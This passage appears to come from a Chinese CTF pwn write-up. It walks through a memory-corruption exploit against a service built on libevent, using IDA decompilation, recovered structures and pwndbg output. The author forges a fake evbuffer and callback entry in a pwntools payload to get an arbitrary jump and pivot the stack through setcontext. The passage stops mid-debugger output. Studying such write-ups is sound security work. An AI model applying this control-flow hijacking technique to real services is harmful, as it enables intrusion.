+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -p 0x7ffff7f78b1a</span><br><span class="line">Searching for a pointer-width integer: b&#x27;\x1a\x8b\xf7\xf7\xff\x7f\x00\x00&#x27;</span><br><span class="line">[heap]          0x55555555c2e8 0x7ffff7f78b1a (evbuffer_remove+74)</span><br><span class="line">[stack]         0x7fffffffd4e8 0x7ffff7f78b1a (evbuffer_remove+74)</span><br><span class="line">[stack]         0x7fffffffd598 0x7ffff7f78b1a (evbuffer_remove+74)</span><br></pre></td></tr></table></figure>
+
+<h3 id="fake-obj构造"><a href="#fake-obj构造" class="headerlink" title="fake_obj构造"></a>fake_obj构造</h3><h4 id="pwn分析"><a href="#pwn分析" class="headerlink" title="pwn分析"></a>pwn分析</h4><p>现在观察<code>handle</code>函数的结构, 可以发现<code>udp</code>连接只会调用<code>sendto</code>, 排除法就可以知道内存破坏相关位于<code>tcp</code>处理中</p>
+<p>也就是进入这个条件判断<code>if ( *(_DWORD *)(dest + 0x20) == 1 &amp;&amp; *(_QWORD *)(dest + 0x28) )</code> </p>
+<p>此时我们还要用IDA同时分析<code>libevent-2.1.so.7.0.1</code>, 可以发现payload要满足以下结构</p>
+<ol>
+<li>头部包含一个IPV4类型的地址</li>
+<li>0x20偏移处解引用后为1</li>
+<li>0x28偏移处解引用后不为0</li>
+</ol>
+<p>最终<code>bufferevent_get_output</code>会返回偏移为0x28处指针的解引用后+0x118内对于的值</p>
+<p>然后传入<code>evbuffer_add_reference</code>中</p>
+<p>据此我们可以构造出前半段payload的结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(pie+0x4040+0x80)+p64(1)*3+p64(pie+0x4040+0x80-0x118)+p64(0)*3+p64(pie+0x40c8)+payload</span><br></pre></td></tr></table></figure>
+
+<p>此时被传入<code>evbuffer_add_reference</code>的一参就是结尾的payload</p>
+<h4 id="libevent-2-1-so-7-0-1-so分析"><a href="#libevent-2-1-so-7-0-1-so分析" class="headerlink" title="libevent-2.1.so.7.0.1.so分析"></a>libevent-2.1.so.7.0.1.so分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// local variable allocation has failed, the output may be wrong!</span><br><span class="line">__int64 __fastcall evbuffer_add_reference(fake_evbuffer *output, char *buf, int a1, __int64 a4, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v6; // r12</span><br><span class="line">  __int64 v7; // rbx</span><br><span class="line">  _OWORD *ptr_1; // rax</span><br><span class="line">  __int64 v9; // rdx</span><br><span class="line">  void *ptr; // rbp</span><br><span class="line">  unsigned int v11; // r12d</span><br><span class="line">  __int64 v12; // rdx</span><br><span class="line">  __int64 v13; // rcx</span><br><span class="line"></span><br><span class="line">  v6 = *(_QWORD *)&amp;a2;</span><br><span class="line">  v7 = *(_QWORD *)&amp;a1;</span><br><span class="line">  ptr_1 = sub_E620(0x10uLL);</span><br><span class="line">  if ( ptr_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_DWORD *)ptr_1 + 8) |= 0xCu;</span><br><span class="line">    ptr = ptr_1;</span><br><span class="line">    *((_QWORD *)ptr_1 + 5) = buf;</span><br><span class="line">    *((_QWORD *)ptr_1 + 1) = v7;</span><br><span class="line">    *((_QWORD *)ptr_1 + 3) = v7;</span><br><span class="line">    *((_QWORD *)ptr_1 + 6) = a4;</span><br><span class="line">    *((_QWORD *)ptr_1 + 7) = v6;</span><br><span class="line">    if ( output-&gt;lock )                         // pass</span><br><span class="line">      evthread_lock_fns_[3](0LL);</span><br><span class="line">    if ( (output-&gt;flags &amp; 4) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = -1;</span><br><span class="line">      event_mm_free_(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = 0;</span><br><span class="line">      sub_EE50(output, (__int64)ptr, v9);</span><br><span class="line">      output-&gt;n_add_for_cb += v7;</span><br><span class="line">      evbuffer_invoke_callbacks_(output, (__int64)ptr, v12, v13);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( output-&gt;lock )</span><br><span class="line">      evthread_lock_fns_[4](0LL);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    return (unsigned int)-1;</span><br><span class="line">  &#125;</span><br><span class="line">  return v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>几乎可以确定漏洞就在<code>evbuffer_add_reference</code>中, 我们仔细梳理这个函数的逻辑, 恢复结构体后可以发现</p>
+<ol>
+<li>存在三种结构体, 包括了链表结构</li>
+<li>存在函数指针, 且可以被我们控制</li>
+</ol>
+<p>恢复出的结构体如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">00000000 struct fake_deferred_cb // sizeof=0x28</span><br><span class="line">00000000 &#123;                                       // XREF: fake_evbuffer/r</span><br><span class="line">00000000     void *queue_next;</span><br><span class="line">00000008     void *queue_prev;</span><br><span class="line">00000010     unsigned __int8 priority;</span><br><span class="line">00000011     unsigned __int8 flags;</span><br><span class="line">00000012     unsigned __int8 pad12[6];</span><br><span class="line">00000018     void (*cb)(void *, void *);</span><br><span class="line">00000020     void *arg;</span><br><span class="line">00000028 &#125;;</span><br><span class="line">00000028 #pragma pack(pop)</span><br><span class="line"></span><br><span class="line">00000000 #pragma pack(push, 8)</span><br><span class="line">00000000 struct fake_evbuffer_cb_entry // sizeof=0x28</span><br><span class="line">00000000 &#123;</span><br><span class="line">00000000     struct fake_evbuffer_cb_entry *next;</span><br><span class="line">00000008     void *prev_nextp;</span><br><span class="line">00000010     void *cb_func;</span><br><span class="line">00000018     void *cbarg;</span><br><span class="line">00000020     unsigned int flags;</span><br><span class="line">00000024     unsigned int pad24;</span><br><span class="line">00000028 &#125;;</span><br><span class="line">00000028 #pragma pack(pop)</span><br><span class="line"></span><br><span class="line">00000000 #pragma pack(push, 8)</span><br><span class="line">00000000 struct fake_evbuffer // sizeof=0x88</span><br><span class="line">00000000 &#123;</span><br><span class="line">00000000     void *first;</span><br><span class="line">00000008     void *last;</span><br><span class="line">00000010     void *last_with_datap;</span><br><span class="line">00000018     unsigned __int64 total_len;</span><br><span class="line">00000020     unsigned __int64 n_add_for_cb;</span><br><span class="line">00000028     unsigned __int64 n_del_for_cb;</span><br><span class="line">00000030     void *lock;</span><br><span class="line">00000038     unsigned __int8 flags;</span><br><span class="line">00000039     unsigned __int8 pad39[7];</span><br><span class="line">00000040     void *deferred_cb_queue;</span><br><span class="line">00000048     unsigned int refcnt;</span><br><span class="line">0000004C     unsigned int pad4c;</span><br><span class="line">00000050     fake_deferred_cb deferred;</span><br><span class="line">00000078     fake_evbuffer_cb_entry *callbacks;</span><br><span class="line">00000080     void *parent;</span><br><span class="line">00000088 &#125;;</span><br><span class="line">00000088 #pragma pack(pop)</span><br><span class="line"></span><br><span class="line">00000000 #pragma pack(push, 8)</span><br><span class="line">00000000 struct fake_evbuffer_chain_ref // sizeof=0x40</span><br><span class="line">00000000 &#123;</span><br><span class="line">00000000     struct fake_evbuffer_chain_ref *next;</span><br><span class="line">00000008     unsigned __int64 buffer_len;</span><br><span class="line">00000010     unsigned __int64 misalign;</span><br><span class="line">00000018     unsigned __int64 off;</span><br><span class="line">00000020     unsigned int flags;</span><br><span class="line">00000024     unsigned int refcnt;</span><br><span class="line">00000028     void *buffer;</span><br><span class="line">00000030     void *cleanup_cb;</span><br><span class="line">00000038     void *cleanup_arg;</span><br><span class="line">00000040 &#125;;</span><br><span class="line">00000040 #pragma pack(pop)</span><br></pre></td></tr></table></figure>
+
+<p>其中我们输入的结构体为<code>fake_evbuffer</code>类型, 其余的结构体通过.so借助我们输入的内容进行生成</p>
+<p>函数指针的调用链路为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evbuffer_add_reference -&gt; evbuffer_invoke_callbacks_ -&gt; sub_EF40 -&gt; cb_func</span><br></pre></td></tr></table></figure>
+
+<p>我们还需要绕过几个函数的检查, 确保不会被exit</p>
+<h4 id="sub-EE50绕过"><a href="#sub-EE50绕过" class="headerlink" title="sub_EE50绕过"></a>sub_EE50绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_EE50(fake_evbuffer *ptr_1, __int64 last, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  void *lock; // rdi</span><br><span class="line">  fake_evbuffer *ptr; // rdi</span><br><span class="line">  _QWORD *last_with_datap; // rax</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  lock = ptr_1-&gt;lock;</span><br><span class="line">  if ( lock &amp;&amp; evthread_lock_debugging_enabled_[0] &amp;&amp; !(unsigned int)evthread_is_debug_lock_held_((__int64)lock) )</span><br><span class="line">    event_errx(0xDEADDEAD, (__int64)&amp;iovec);</span><br><span class="line">  ptr = (fake_evbuffer *)ptr_1-&gt;last_with_datap;</span><br><span class="line">  if ( ptr-&gt;first )</span><br><span class="line">  &#123;</span><br><span class="line">    last_with_datap = sub_3CFF0(ptr, last, a3);</span><br><span class="line">    *last_with_datap = last;</span><br><span class="line">    if ( *(_QWORD *)(last + 0x18) )</span><br><span class="line">      ptr_1-&gt;last_with_datap = last_with_datap;</span><br><span class="line">    ptr_1-&gt;last = (void *)last;</span><br><span class="line">    result = *(_QWORD *)(last + 0x18);</span><br><span class="line">    ptr_1-&gt;total_len += result;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( ptr != ptr_1 )</span><br><span class="line">      event_errx(0xDEADDEAD, (__int64)&amp;iovec);</span><br><span class="line">    ptr_1-&gt;last = (void *)last;</span><br><span class="line">    ptr_1-&gt;first = (void *)last;</span><br><span class="line">    result = *(_QWORD *)(last + 0x18);</span><br><span class="line">    ptr_1-&gt;total_len += result;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们遵循最短路径原则, 尽量不调用更多函数, 就要走入else分支</p>
+<p>这需要满足条件</p>
+<ol>
+<li>ptr &#x3D;&#x3D; ptr_1</li>
+<li>ptr-&gt;first&#x3D;&#x3D;null</li>
+</ol>
+<p>由于伪造结构体的前几个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj = flat(&#123;</span><br><span class="line">    # fake evbuffer</span><br><span class="line">    0x00: p64(0),                   # first = NULL</span><br><span class="line">    0x08: p64(0),                   # last = NULL</span><br><span class="line">    0x10: p64(fake_output),         # last_with_datap = self</span><br></pre></td></tr></table></figure>
+
+<h4 id="锁绕过"><a href="#锁绕过" class="headerlink" title="锁绕过"></a>锁绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall evbuffer_invoke_callbacks_(fake_evbuffer *output, __int64 a2, __int64 a3, __int64 a4)</span><br><span class="line">&#123;</span><br><span class="line">  void *parent; // rdi</span><br><span class="line"></span><br><span class="line">  if ( output-&gt;callbacks )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (output-&gt;flags &amp; 8) != 0</span><br><span class="line">      &amp;&amp; (unsigned int)event_deferred_cb_schedule_(</span><br><span class="line">                         (__int64)output-&gt;deferred_cb_queue,</span><br><span class="line">                         (__int64)&amp;output-&gt;deferred,</span><br><span class="line">                         a3,</span><br><span class="line">                         a4) )</span><br><span class="line">    &#123;</span><br><span class="line">      evbuffer_incref_and_lock_((__int64)output);</span><br><span class="line">      parent = output-&gt;parent;</span><br><span class="line">      if ( parent )</span><br><span class="line">        bufferevent_incref((__int64)parent);</span><br><span class="line">      if ( output-&gt;lock )</span><br><span class="line">        evthread_lock_fns_[4](0LL);</span><br><span class="line">    &#125;</span><br><span class="line">    sub_EF40((__int64)output, 0);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    output-&gt;n_del_for_cb = 0LL;</span><br><span class="line">    output-&gt;n_add_for_cb = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果不想进入上方复杂函数处理, 我们需要让flag字段不满足if条件</p>
+<p>进入<code>sub_EF40</code>后, 因为a2恒为<code>0</code>,所以n3恒为<code>1</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_EF40(fake_evbuffer *output, _BOOL4 a2)</span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 v3; // r13d</span><br><span class="line">  int n3_1; // r15d</span><br><span class="line">  int n3; // r14d</span><br><span class="line">  void *lock; // rdi</span><br><span class="line">  fake_evbuffer_cb_entry *callbacks; // rbx</span><br><span class="line">  unsigned __int64 n_add_for_cb; // rdx</span><br><span class="line">  unsigned __int64 n_del_for_cb; // rax</span><br><span class="line">  unsigned __int64 total_len; // r12</span><br><span class="line">  fake_evbuffer_cb_entry *callbacks_1; // rax</span><br><span class="line">  unsigned int flags; // edx</span><br><span class="line">  void (__fastcall *cb_func)(fake_evbuffer *, _QWORD, unsigned __int64, void *); // r8</span><br><span class="line">  _QWORD v15[3]; // [rsp+0h] [rbp-58h] BYREF</span><br><span class="line">  unsigned __int64 v16; // [rsp+18h] [rbp-40h]</span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(0x28u);</span><br><span class="line">  if ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = a2;</span><br><span class="line">    n3_1 = 1;</span><br><span class="line">    n3 = 3;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (output-&gt;flags &amp; 8) == 0;</span><br><span class="line">    n3_1 = (output-&gt;flags &amp; 8) == 0 ? 1 : 3;</span><br><span class="line">    n3 = n3_1;</span><br><span class="line">  &#125;</span><br><span class="line">  lock = output-&gt;lock;</span><br><span class="line">  if ( lock &amp;&amp; evthread_lock_debugging_enabled_[0] &amp;&amp; !(unsigned int)evthread_is_debug_lock_held_((__int64)lock) )</span><br><span class="line">    event_errx(0xDEADDEAD, (__int64)&amp;iovec);</span><br><span class="line">  callbacks = output-&gt;callbacks;</span><br><span class="line">  if ( callbacks )</span><br><span class="line">  &#123;</span><br><span class="line">    n_add_for_cb = output-&gt;n_add_for_cb;</span><br><span class="line">    n_del_for_cb = output-&gt;n_del_for_cb;</span><br><span class="line">    if ( *(_OWORD *)&amp;output-&gt;n_add_for_cb != 0LL )</span><br><span class="line">    &#123;</span><br><span class="line">      total_len = output-&gt;total_len;</span><br><span class="line">      v15[1] = output-&gt;n_add_for_cb;</span><br><span class="line">      v15[2] = n_del_for_cb;</span><br><span class="line">      v15[0] = total_len + n_del_for_cb - n_add_for_cb;</span><br><span class="line">      if ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        output-&gt;n_add_for_cb = 0LL;</span><br><span class="line">        output-&gt;n_del_for_cb = 0LL;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        callbacks_1 = callbacks;</span><br><span class="line">        callbacks = callbacks-&gt;next;</span><br><span class="line">        flags = callbacks_1-&gt;flags;</span><br><span class="line">        if ( (n3 &amp; flags) != n3_1 )</span><br><span class="line">          goto LABEL_11;</span><br><span class="line">        cb_func = (void (__fastcall *)(fake_evbuffer *, _QWORD, unsigned __int64, void *))callbacks_1-&gt;cb_func;</span><br><span class="line">        if ( (flags &amp; 0x40000) != 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          cb_func(output, v15[0], total_len, callbacks_1-&gt;cbarg);</span><br><span class="line">LABEL_11:</span><br><span class="line">          if ( !callbacks )</span><br><span class="line">            return v16 - __readfsqword(0x28u);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          ((void (__fastcall *)(fake_evbuffer *, _QWORD *, void *))cb_func)(output, v15, callbacks_1-&gt;cbarg);</span><br><span class="line">          if ( !callbacks )</span><br><span class="line">            return v16 - __readfsqword(0x28u);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    output-&gt;n_del_for_cb = 0LL;</span><br><span class="line">    output-&gt;n_add_for_cb = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return v16 - __readfsqword(0x28u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到如果<code>(n3 &amp; flags) != n3_1</code>, 也就是我们的flags字段的最低位必须为<code>1</code>, 否则会退出函数</p>
+<p>最后总结出obj需基于以下生成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">fake_output=pie+0x40c8</span><br><span class="line">fake_cb=fake_output+0x88</span><br><span class="line">target=target</span><br><span class="line">cb_arg=pie+0x40c8+0xf0+0x50</span><br><span class="line">obj = flat(&#123;</span><br><span class="line">    # fake evbuffer</span><br><span class="line">    0x00: p64(0),                   # first = NULL</span><br><span class="line">    0x08: p64(0),                   # last = NULL</span><br><span class="line">    0x10: p64(fake_output),         # last_with_datap = self</span><br><span class="line">    0x18: p64(0),                   # total_len</span><br><span class="line">    0x20: p64(0),                   # n_add_for_cb</span><br><span class="line">    0x28: p64(0),                   # n_del_for_cb</span><br><span class="line">    0x30: p64(0),                   # lock = NULL</span><br><span class="line">    0x38: p64(0),                   # flags + padding，别开 deferred</span><br><span class="line">    0x40: p64(0),                   # deferred_cb_queue = NULL</span><br><span class="line">    0x48: p32(1) + p32(0),          # refcnt = 1</span><br><span class="line">    0x50: b&#x27;\x00&#x27; * 0x28,           # fake_deferred_cb，先全 0</span><br><span class="line">    0x78: p64(fake_cb),             # callbacks = &amp;fake_cb</span><br><span class="line">    0x80: p64(0),                   # parent = NULL</span><br><span class="line"></span><br><span class="line">    0x88: p64(0),                   # next = NULL</span><br><span class="line">    0x90: p64(fake_output + 0x78),  # prev_nextp</span><br><span class="line">    0x98: p64(target),              # cb_func</span><br><span class="line">    0xA0: p64(cb_arg),              # cbarg</span><br><span class="line">    0xA8: p64(1)</span><br><span class="line">&#125;, filler=b&#x27;\x00&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>此时我们经过调试可以确认, 我们拥有一次任意跳转的机会, 跳转到<code>target</code>上</p>
+<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, 0x00007ffff7f73ff2 in ?? () from ./libevent-2.1.so.7.0.1</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x555555558150 ◂— 0</span><br><span class="line"> RBX  0</span><br><span class="line">*RCX  0x555555558208 —▸ 0x5555555553a3 ◂— ret </span><br><span class="line">*RDX  0x50</span><br><span class="line">*RDI  0x5555555580c8 —▸ 0x55555555dec0 ◂— 0</span><br><span class="line">*RSI  0</span><br><span class="line">*R8   0x7ffff7c539e0 (setcontext) ◂— endbr64 </span><br><span class="line">*R9   4</span><br><span class="line">*R10  0</span><br><span class="line"> R11  0x246</span><br><span class="line">*R12  0x50</span><br><span class="line">*R13  0x7fffffffd480 ◂— 0</span><br><span class="line">*R14  1</span><br><span class="line">*R15  1</span><br><span class="line">*RBP  0x5555555580c8 —▸ 0x55555555dec0 ◂— 0</span><br><span class="line">*RSP  0x7fffffffd480 ◂— 0</span><br><span class="line">*RIP  0x7ffff7f73ff2 ◂— call r8</span><br><span class="line">──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7f73ff2    call   r8                          &lt;setcontext&gt;</span><br><span class="line">        ucp: 0x5555555580c8 —▸ 0x55555555dec0 ◂— 0</span><br><span class="line"> </span><br><span class="line">   0x7ffff7f73ff5    test   rbx, rbx</span><br><span class="line">   0x7ffff7f73ff8    je     0x7ffff7f74030              &lt;0x7ffff7f74030&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff7f73ffa    mov    rax, rbx</span><br><span class="line">   0x7ffff7f73ffd    mov    rbx, qword ptr [rbx]</span><br><span class="line">   0x7ffff7f74000    mov    edx, dword ptr [rax + 0x20]</span><br><span class="line">   0x7ffff7f74003    mov    ecx, edx</span><br><span class="line">   0x7ffff7f74005    and    ecx, r14d</span><br><span class="line">   0x7ffff7f74008    cmp    ecx, r15d</span><br><span class="line">   0x7ffff7f7400b    jne    0x7ffff7f73ff5              &lt;0x7ffff7f73ff5&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff7f7400d    and    edx, 0x40000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ r13 rsp 0x7fffffffd480 ◂— 0</span><br><span class="line">01:0008│         0x7fffffffd488 ◂— 0x50 /* &#x27;P&#x27; */</span><br><span class="line">02:0010│         0x7fffffffd490 ◂— 0</span><br><span class="line">03:0018│         0x7fffffffd498 ◂— 0xa6d8d54c83c3ff00</span><br><span class="line">04:0020│         0x7fffffffd4a0 ◂— 0x6f6e280000000000</span><br><span class="line">05:0028│         0x7fffffffd4a8 ◂— 0x50 /* &#x27;P&#x27; */</span><br><span class="line">06:0030│         0x7fffffffd4b0 —▸ 0x55555555dec0 ◂— 0</span><br><span class="line">07:0038│         0x7fffffffd4b8 ◂— 0</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0   0x7ffff7f73ff2 None</span><br><span class="line">   1   0x7ffff7f75d35 evbuffer_add_reference+133</span><br><span class="line">   2   